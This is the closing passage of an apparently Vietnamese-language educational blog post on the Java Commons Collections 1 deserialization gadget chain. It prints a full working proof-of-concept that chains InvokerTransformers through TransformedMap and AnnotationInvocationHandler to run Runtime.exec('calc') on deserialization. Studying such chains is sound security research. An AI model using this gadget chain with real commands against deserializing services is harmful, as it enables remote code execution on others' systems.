+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Annotation;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testTransformedMap</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        String[] cmd = <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;calc&quot;</span>&#125;;</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;test-value&quot;</span>);</span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        Map&lt;Object, Object&gt; map = (TransformedMap) TransformedMap.decorate(hashMap, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">aihClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">aihClassConstructor</span> <span class="operator">=</span> aihClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        aihClassConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">aihObject</span> <span class="operator">=</span> aihClassConstructor.newInstance(Target.class, map);</span><br><span class="line">        serialize(aihObject);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Chạy file và máy tính đã bật lên…</p>
+<h2 id="Loi-ket"><a href="#Loi-ket" class="headerlink" title="Lời kết"></a>Lời kết</h2><p>Và đến đây là mình đã hoàn thành chain <em>Commons Collections 1</em> theo hướng TransformedMap, là chain đầu tiên mình làm và bước chân vào con đường Java Security. Thật sự rất nhiều kiến thức mình thiếu, qua việc đọc mã nguồn của nhà phát hành, cách những master OOP sử dụng nó trong các thư viện, mình cũng đã học được nhiều kiến thức về Java OOP. Hy vọng các bạn nào mới bước chân vào Java Security như mình hãy cố gắng nghiên cứu, đọc hiểu từ từ để có thể hiểu một cách rõ nhất về cái đẹp của Java OOP. Thực sự rất khó cho người mới học nên hy vọng các bạn có thể vượt qua ^^. </p>
+<blockquote>
+<p>Chúc các bạn học tốt~</p>
+</blockquote>
+</div>
+        </div>
+        
+        <footer class="kratos-entry-footer clearfix">
+            
+                <div class="post-like-donate text-center clearfix" id="post-like-donate">
+                
+                
+                    <a class="share" href="javascript:;"><i class="fa fa-share-alt"></i> Chia sẻ</a>
+                    <div class="share-wrap" style="display: none;">
+    <div class="share-group">
+        <a href="javascript:;" class="share-plain qq" onclick="share('qq');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-qq"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain qzone" onclick="share('qzone');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-star"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weixin pop style-plain" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weixin"></i>
+            </div>
+            <div class="share-int">
+                <div class="qrcode" id="wechat-qr"></div>
+                <p>打开微信“扫一扫”，打开网页后点击屏幕右上角分享按钮</p>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weibo" onclick="share('weibo');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weibo"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain facebook style-plain" onclick="share('facebook');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-facebook"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain twitter style-plain" onclick="share('twitter');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-twitter"></i>
+            </div>
+        </a>
+    </div>
+    <script type="text/javascript">
+        $(()=>{
+            new QRCode("wechat-qr", {
+                text: "https://rayinaw.github.io/2022/11/04/Commons-Collections1-TransformedMap/",
+                width: 150,
+                height: 150,
+                correctLevel : QRCode.CorrectLevel.H
+            });
+        });
+        function share(dest) {
+            const qqBase        = "https://connect.qq.com/widget/shareqq/index.html?";
+            const weiboBase     = "https://service.weibo.com/share/share.php?";
+            const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
+            const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
+            const twitterBase   = "https://twitter.com/intent/tweet?";
+            const hostUrl       = "https://rayinaw.github.io/2022/11/04/Commons-Collections1-TransformedMap/";
+            const title         = "「Phân tích chuỗi Commons Collections 1 với TransformedMap」";
+            const excerpt       = `Một vài khái niệm cần nắmTrước tiên chúng ta cần hình dung lớp Runtime sẽ exec câu lệnh như nào, ở đây mình có sử dụn...`;
+            let _URL;
+            switch (dest) {
+                case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
+                case "weibo"    : _URL = weiboBase+"url="+hostUrl+"&title="+title+excerpt;                                 break;
+                case "qzone"    : _URL = qzoneBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";  break;
+                case "facebook" : _URL = facebookBase+"u="+hostUrl;                                                        break;
+                case "twitter"  : _URL = twitterBase+"text="+title+excerpt+"&url="+hostUrl;                                break;
+            }
+            window.open(_URL);
+        };
+    </script>
+</div>
+                
+                </div>
+            
+            <div class="footer-tag clearfix">
+                <div class="pull-left">
+                <i class="fa fa-tags"></i>
+                    <a class="tag-none-link" href="/tags/Java-Deserialization-Commons-Collections/" rel="tag">Java, Deserialization, Commons Collections</a>
+                </div>
+                <div class="pull-date">
+                    <time datetime="2022-12-14T20:31:49.395Z" itemprop="dateModified">Lần chỉnh sửa cuối cùng：2022-12-15</time>
+                </div>
+            </div>
+        </footer>
+    </div>
+    
+        <nav class="navigation post-navigation clearfix" role="navigation">
+            
+            <div class="nav-previous clearfix">
+                <a title=" Introduction to Java Deserialization" href="/2022/11/03/JavaDeserializationBasic/">&lt; Bài đăng cũ hơn</a>
+            </div>
+            
+            
+            <div class="nav-next clearfix">
+                <a title=" Tính năng mới của Mysql 8" href="/2022/11/27/sqli-mysql8/">Bài đăng mới hơn &gt;</a>
+            </div>
+            
+        </nav>
+    
+    
+</article>
+
+        
+
+            </section>
+
+        
+
+                
+            
+
+<section id="kratos-widget-area" class="col-md-4 hidden-xs hidden-sm">
+    <!-- 文章和页面根据splitter来分割，没有的话就从头开始设置为sticky -->
+    
+    
+                <aside id="krw-about" class="widget widget-kratos-about clearfix">
+    <div class="photo-background"></div>
+    <div class="photo-wrapper clearfix">
+        <div class="photo-wrapper-tip text-center">
+            <img class="about-photo" src="/images/avatar.webp" loading="lazy" decoding="auto" />
+        </div>
+    </div>
+    <div class="textwidget">
+        <p class="text-center">来年の事を言えば鬼が笑う</p>
+    </div>
+    <div class="site-meta">
+        <a class="meta-item" href="/archives/">
+            <span class="title">
+                Bài đăng
+            </span>
+            <span class="count">
+                6
+            </span>
+        </a>
+        <a class="meta-item" href="/categories/">
+            <span class="title">
+                Thể loại
+            </span>
+            <span class="count">
+                8
+            </span>
+        </a>
+        <a class="meta-item" href="/tags/">
+            <span class="title">
+                Thẻ
+            </span>
+            <span class="count">
+                9
+            </span>
+        </a>
+    </div>
+</aside>
+            
+                    <div class="sticky-area">
+                
+                
+  <aside id="krw-categories" class="widget widget-kratos-categories clearfix">
+    <h4 class="widget-title"><i class="fa fa-folder"></i>Thể loại</h4>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/DevOps/">DevOps</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/DevOps/Docker/">Docker</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/HTTP-Request-Smuggling/">HTTP Request Smuggling</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Java/">Java</a><span class="category-list-count">3</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Java/Deserialization/">Deserialization</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Java/Programming/">Programming</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Mysql/">Mysql</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Mysql/SQLi/">SQLi</a><span class="category-list-count">1</span></li></ul></li></ul>
+  </aside>
+
+
+            
+                
+  <aside id="krw-tags" class="widget widget-kratos-tags clearfix">
+    <h4 class="widget-title"><i class="fa fa-tags"></i>Những thẻ hiện có</h4>
+      <div class="tag-clouds">
+        <a href="/tags/Deserialization/" style="font-size: 0.6em;">Deserialization</a> <a href="/tags/Docker/" style="font-size: 0.6em;">Docker</a> <a href="/tags/HRS/" style="font-size: 0.6em;">HRS</a> <a href="/tags/Java/" style="font-size: 0.8em;">Java</a> <a href="/tags/Java-Deserialization-Commons-Collections/" style="font-size: 0.6em;">Java, Deserialization, Commons Collections</a> <a href="/tags/Mysql/" style="font-size: 0.6em;">Mysql</a> <a href="/tags/Programming/" style="font-size: 0.6em;">Programming</a> <a href="/tags/Reflection/" style="font-size: 0.6em;">Reflection</a> <a href="/tags/SQLi/" style="font-size: 0.6em;">SQLi</a>
+      </div>
+  </aside>
+
+            
+                
+  <aside id="krw-posts" class="widget widget-kratos-posts">
+  <h4 class="widget-title"><i class="fa fa-file"></i>Bài viết gần đây</h4>
+  <div class="tab-content">
+      <ul class="list-group">
+        
+        
+          
+          
+            <a class="list-group-item" href="/2022/12/03/docker-learning/"><i class="fa  fa-book"></i> Một bản ghi chép nhỏ về Docker</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2022/11/30/http-request-smuggling-HTTP-1.1/"><i class="fa  fa-book"></i> Khái niệm cơ bản về HTTP request smuggling với HTTP/1.1</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2022/11/27/sqli-mysql8/"><i class="fa  fa-book"></i> Tính năng mới của Mysql 8</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2022/11/04/Commons-Collections1-TransformedMap/"><i class="fa  fa-book"></i> Phân tích chuỗi Commons Collections 1 với TransformedMap</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2022/11/03/JavaDeserializationBasic/"><i class="fa  fa-book"></i> Introduction to Java Deserialization</a>
+            
+          
+        
+          
+            
+      </ul>
+  </div>
+  </aside>
+
+            
+    </div>
+</section>
+        
+        </div>
+    </div>
+</div>
+<footer>
+    <div id="footer"  class="ap-lrc"  >
+        <div class="container">
+            <div class="row">
+                <div class="col-md-6 col-md-offset-3 footer-list text-center">
+                    <ul class="kratos-social-icons">
+                        
+                        <li><a href="mailto:rayin.awarf@gmail.com"><i class="fa fa-envelope"></i></a></li>
+                        <li><a target="_blank" rel="nofollow" href="https://t.me/rayinaw"><i class="fa fa-telegram"></i></a></li>
+                        
+                        
+                        
+                        
+                        <li><a target="_blank" rel="nofollow" href="https://github.com/rayinaw"><i class="fa fa-github"></i></a></li>
+                        
+                    </ul>
+                    <ul class="kratos-copyright">
+                        <div>
+                            <li>&copy; 2022 Rayinaw All rights reserved.</li>
+                            <li>This site has been running for<span id="span_dt">Loading...</span></li>
+                        </div>
+                        <div>
+                            <li>Theme <a href="https://github.com/Candinya/Kratos-Rebirth" target="_blank">Kratos:Rebirth</a></li>
+                            <li>Site built with&nbsp;<i class="fa fa-heart throb" style="color:#d43f57"></i>&nbsp;by Rayinaw.</li>
+                        </div>
+                        <div>
+                            <li>Powered by <a href="https://hexo.io" target="_blank" rel="nofollow">Hexo</a></li>
+                            <li>Hosted on <a href="https://github.io" target="_blank">Github Pages</a></li>
+                        </div>
+                        <div>
+                            
+                            
+                        </div>
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <div class="kr-tool text-center">
+            <div class="tool">
+                
+                    <div class="box search-box">
+                        <a href="/search/">
+                            <span class="fa fa-search"></span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="box theme-box" id="darkmode-switch">
+                        <span class="fa fa-adjust"></span>
+                    </div>
+                
+                
+            </div>
+            <div class="box gotop-box">
+                <span class="fa fa-chevron-up"></span>
+            </div>
+        </div>
+    </div>
+</footer>
+</div>
+</div>
+
+        <script defer src="/vendors/bootstrap@3.3.4/dist/js/bootstrap.min.js"></script>
+<script defer src="/vendors/nprogress@0.2.0/nprogress.js"></script>
+<script>
+    if (!window.kr) {
+        window.kr = {};
+    }
+    window.kr.notMobile = (!(navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)));
+    window.kr.siteRoot = "/";
+</script>
+
+    <div>
+        <canvas id="snow"></canvas>
+        <script async src="/js/snow.min.js"></script>
+    </div>
+
+
+    <script async src="/js/candy.min.js"></script>
+
+
+
+    <script defer src="/vendors/aplayer@1.10.1/dist/APlayer.min.js"></script>
+    
+    <script defer src="/vendors/meting@2.0.1/dist/Meting.min.js"></script>
+    <meting-js
+        server="netease"
+        type="playlist"
+        id="3204190542"
+        order="random"
+        fixed="true"
+    >
+    </meting-js>
+
+
+
+    <script defer src="/vendors/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+<script defer src="/vendors/clipboard@2.0.6/dist/clipboard.min.js"></script>
+<script defer src="/js/kratosr.min.js"></script>
+<script defer src="/js/pjax.min.js"></script>
+
+
+
+<!-- Extra support for third-party plguins  -->
+
+
+    </body>
+</html>
